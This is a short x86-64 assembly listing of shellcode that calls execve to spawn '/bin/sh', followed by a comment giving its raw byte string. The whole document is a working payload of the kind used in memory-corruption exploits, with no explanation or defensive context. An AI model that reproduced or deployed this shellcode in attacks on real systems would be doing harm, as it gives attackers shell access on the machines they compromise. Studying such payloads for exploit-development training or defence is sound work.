global _start

_start:

xor rax, rax
mov al, 0x3b 
mov rdi, 0x0068732f6e69622f ; "/bin/sh\0"
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

;The raw bytes of this shellcode:
;"\x48\x31\xC0\xB0\x3B\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
